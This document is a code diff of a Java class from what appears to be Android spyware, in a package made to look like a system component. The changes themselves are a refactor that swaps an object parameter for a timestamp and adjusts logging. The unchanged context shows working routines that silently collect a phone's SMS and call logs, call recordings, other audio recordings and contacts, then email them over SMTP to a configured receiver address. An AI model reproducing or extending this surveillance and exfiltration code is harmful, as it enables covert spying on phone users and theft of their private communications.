@@ -32,7 +32,6 @@ import com.android.system.controled.db.InnerDbOpera;
 public class SendEmailUtil {
 
 	private static final String TAG = "SendEmailUtil";
-
 	public static final String host = "smtp.163.com";
 
 	// public static final String host = "smtp.gmail.com";
@@ -76,7 +75,7 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadSmsCallLog(boolean uploadEvenIfMobile, final Code code) {
+	public void upLoadSmsCallLog(boolean uploadEvenIfMobile, final long codeDateTime) {
 		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
 			new Thread(new Runnable() {
 
@@ -106,9 +105,9 @@ public class SendEmailUtil {
 						}
 
 						if (sendMail("短信通话记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
-							codeDoSuccess(code);
+							codeDoSuccess(codeDateTime);
 						} else {
-							updateFailedTimes(code);
+							updateFailedTimes(codeDateTime);
 						}
 					} catch (Exception e) {
 						e.printStackTrace();
@@ -118,7 +117,7 @@ public class SendEmailUtil {
 			}).start();
 
 		} else {
-			updateFailedTimes(code);
+			updateFailedTimes(codeDateTime);
 		}
 
 	}
@@ -132,7 +131,7 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadCallAudios(boolean uploadEvenIfMobile, final Code code) {
+	public void upLoadCallAudios(boolean uploadEvenIfMobile, final long codeDateTime) {
 		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
 			new Thread(new Runnable() {
 
@@ -158,9 +157,9 @@ public class SendEmailUtil {
 						}
 
 						if (sendMail("通话录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
-							codeDoSuccess(code);
+							codeDoSuccess(codeDateTime);
 						} else {
-							updateFailedTimes(code);
+							updateFailedTimes(codeDateTime);
 						}
 					} catch (Exception e) {
 						e.printStackTrace();
@@ -169,7 +168,7 @@ public class SendEmailUtil {
 			}).start();
 
 		} else {
-			updateFailedTimes(code);
+			updateFailedTimes(codeDateTime);
 		}
 
 	}
@@ -183,7 +182,7 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadOtherAudios(boolean uploadEvenIfMobile, final Code code) {
+	public void upLoadOtherAudios(boolean uploadEvenIfMobile, final long codeDateTime) {
 		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
 			new Thread(new Runnable() {
 
@@ -209,9 +208,9 @@ public class SendEmailUtil {
 						}
 
 						if (sendMail("其它录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
-							codeDoSuccess(code);
+							codeDoSuccess(codeDateTime);
 						} else {
-							updateFailedTimes(code);
+							updateFailedTimes(codeDateTime);
 						}
 					} catch (Exception e) {
 						e.printStackTrace();
@@ -220,7 +219,7 @@ public class SendEmailUtil {
 			}).start();
 
 		} else {
-			updateFailedTimes(code);
+			updateFailedTimes(codeDateTime);
 		}
 	}
 
@@ -233,7 +232,7 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadALL(boolean uploadEvenIfMobile, final Code code) {
+	public void upLoadALL(boolean uploadEvenIfMobile, final long codeDateTime) {
 		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
 			new Thread(new Runnable() {
 
@@ -286,9 +285,9 @@ public class SendEmailUtil {
 						}
 
 						if (sendMail("所有记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
-							codeDoSuccess(code);
+							codeDoSuccess(codeDateTime);
 						} else {
-							updateFailedTimes(code);
+							updateFailedTimes(codeDateTime);
 						}
 					} catch (Exception e) {
 						e.printStackTrace();
@@ -297,7 +296,7 @@ public class SendEmailUtil {
 			}).start();
 
 		} else {
-			updateFailedTimes(code);
+			updateFailedTimes(codeDateTime);
 		}
 
 	}
@@ -311,7 +310,7 @@ public class SendEmailUtil {
 	 * @author: zhuanggy
 	 * @date:2012-12-3
 	 */
-	public void upLoadContact(boolean uploadEvenIfMobile, final Code code) {
+	public void upLoadContact(boolean uploadEvenIfMobile, final long codeDateTime) {
 		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
 			new Thread(new Runnable() {
 
@@ -334,9 +333,9 @@ public class SendEmailUtil {
 						}
 
 						if (sendMail("联系人  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
-							codeDoSuccess(code);
+							codeDoSuccess(codeDateTime);
 						} else {
-							updateFailedTimes(code);
+							updateFailedTimes(codeDateTime);
 						}
 					} catch (Exception e) {
 						e.printStackTrace();
@@ -345,14 +344,16 @@ public class SendEmailUtil {
 			}).start();
 
 		} else {
-			updateFailedTimes(code);
+			updateFailedTimes(codeDateTime);
 		}
 
 	}
 
-	private void codeDoSuccess(Code code) {
+	private void codeDoSuccess(long time) {
 		try {
+			Code code = new Code();
 			code.setResult(Code.RESULT_OK);
+			code.setDate(time);
 			mDbOperater.updateCodeResult(code);
 		} catch (Exception e) {
 			e.printStackTrace();
@@ -360,9 +361,10 @@ public class SendEmailUtil {
 	
 	}
 
-	private void updateFailedTimes(Code code) {
+	private void updateFailedTimes(long time) {
+		Debug.e(TAG, "失败次数+1");
 		try {
-			mDbOperater.updateCodeFailedTimes(code);
+			mDbOperater.updateCodeFailedTimes(time);
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
@@ -385,7 +387,7 @@ public class SendEmailUtil {
 	 * */
 	private synchronized boolean sendMail(String subject, String body, String recipients, Vector<String> files) {
 
-		Log.e(TAG, "recipients=" + recipients);
+		Debug.e(TAG, "recipients=" + recipients);
 
 		MimeMessage message = new MimeMessage(initialize());
 
